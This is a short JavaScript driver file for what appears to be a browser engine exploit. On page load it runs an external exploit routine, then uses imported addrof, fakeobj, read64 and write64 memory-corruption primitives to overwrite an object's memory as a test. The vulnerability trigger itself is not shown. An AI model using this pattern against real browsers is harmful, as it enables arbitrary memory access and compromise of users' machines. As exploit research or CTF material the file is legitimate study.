// main.js
import { addrof, fakeobj, read64, write64 } from './mem.js';

function log(msg) {
    const logDiv = document.getElementById('log');
    logDiv.textContent += msg + '\n';
    void logDiv.offsetHeight;
}

window.onload = async function() {
    log('Starting exploit...');
    try {
        await window.runExploit(log);
        log('Exploit complete!');
        // Example usage of primitives:
        // let addr = addrof({});
        // let fake = fakeobj(addr);
        // let val = read64(addr);
        var goofy = {};
        var emptyObjectAddr = addrof(goofy);
        write64(emptyObjectAddr, 0x41414141n);
        log("[TEST] obj dat: " + goofy);
    } catch(e) {
        log('Exploit failed: ' + e);
    }
};
